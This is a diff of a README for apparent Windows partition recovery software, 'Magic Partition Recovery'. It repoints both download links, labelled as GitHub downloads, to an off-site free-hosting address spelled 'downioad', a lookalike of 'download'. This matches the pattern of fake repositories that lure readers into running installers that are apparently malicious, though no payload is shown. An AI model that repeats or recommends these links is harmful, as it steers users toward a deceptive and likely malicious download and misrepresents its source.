@@ -2,7 +2,7 @@
 
 Magic Partition Recovery is a comprehensive software designed for Windows 10 and 11 users to recover lost or deleted partitions and data. With its advanced algorithms and user-friendly interface, it ensures high success rates in data retrieval from various storage devices.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Features
 
@@ -54,7 +54,7 @@ You can reach out through the GitHub repository's Issues section or visit our of
 
 To get started with Magic Partition Recovery, download the installer from the official source:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ## Legal Notice
 
